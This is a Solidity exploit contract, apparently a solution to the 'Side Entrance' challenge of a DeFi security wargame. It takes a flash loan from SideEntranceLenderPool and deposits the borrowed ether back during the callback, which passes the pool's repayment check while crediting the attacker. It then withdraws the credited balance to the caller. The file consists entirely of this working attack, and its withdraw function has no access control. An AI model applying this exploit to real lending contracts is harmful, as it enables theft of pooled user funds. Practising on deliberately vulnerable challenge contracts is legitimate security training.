
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";


contract FlashLoanEtherReceiver {

    using Address for address payable;

    SideEntranceLenderPool public immutable pool;
    address payable public immutable poolAddress;

    constructor(address payable _poolAddress){
        poolAddress = _poolAddress;
        pool = SideEntranceLenderPool(_poolAddress);
    }
    function execute() external payable {

        require(address(this).balance >= msg.value);
        require(msg.sender == address(pool));

        // msg.sender.call{value: msg.value}("");
        // require(success, "transfer failed");
        // pool.deposit();
        payable(poolAddress).functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            msg.value
        );
    }


    function executeFlashloan(uint256 _amount) external {
        pool.flashLoan(_amount);
    }


    function withdraw() external {
       pool.withdraw(); 
       payable(msg.sender).transfer(address(this).balance);
    }


    receive () external payable {}
}